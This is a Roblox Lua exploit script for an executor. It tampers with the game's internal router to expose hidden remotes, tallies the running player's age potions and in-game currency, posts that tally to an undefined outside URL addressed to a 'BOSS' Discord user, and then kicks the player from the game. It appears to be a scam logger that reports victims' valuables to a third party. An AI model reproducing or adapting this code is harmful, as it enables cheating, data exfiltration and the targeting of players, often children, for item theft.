local Data = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local localPlayer = game.Players.LocalPlayer
local Fsys = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
local rawAmount = game:GetService("Players").LocalPlayer.PlayerGui.BucksIndicatorApp.CurrencyIndicator.Container.Amount.Text
local amount = rawAmount:gsub(",", "") -- Remove commas from the raw amount
local Counter = 0
local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer.PlayerGui
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.new(1, 1, 1)
frame.Parent = gui
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.Text = "Starting"
textLabel.TextSize = 20
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.Parent = frame

-- Ensure Fsys("RouterClient").init is defined and has upvalues
local routerClientInit = Fsys("RouterClient").init
if routerClientInit then
    local upvalue = getupvalue(routerClientInit, 4)
    if upvalue then
        local function rename(remotename, hashedremote)
            hashedremote.Name = remotename
        end
        table.foreach(upvalue, rename)
    else
        warn("Failed to get upvalue from RouterClient.init")
    end
else
    warn("RouterClient.init is not defined")
end

local playerData = Data.get_data()[tostring(game.Players.LocalPlayer)]
if playerData and playerData.inventory and playerData.inventory.food then
    for i, v in pairs(playerData.inventory.food) do
        if v.kind == "pet_age_potion" then
            Counter = Counter + 1
            task.wait(0.1)
        end
    end
else
    warn("Player inventory data is missing or malformed")
end

wait(1)

local data = {
    ["content"] = ("BOSS <@" .. discordid .. "> 🤖 " .. localPlayer.Name .. " has 🍾 " .. Counter .. " Age Potions! and " .. amount .. " 💸 bucks"),
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}
local request = http_request or request or HttpPost or syn and syn.request
if not request then
    warn("HTTP request function is not defined")
else
    local payload = {
        Url = url,
        Body = newdata,
        Method = "POST",
        Headers = headers
    }

    request(payload)
end

wait(1)
localPlayer:Kick("🤖 " .. localPlayer.Name .. " has 🍾 " .. Counter .. " Age Potions! and " .. amount .. " 💸 bucks")
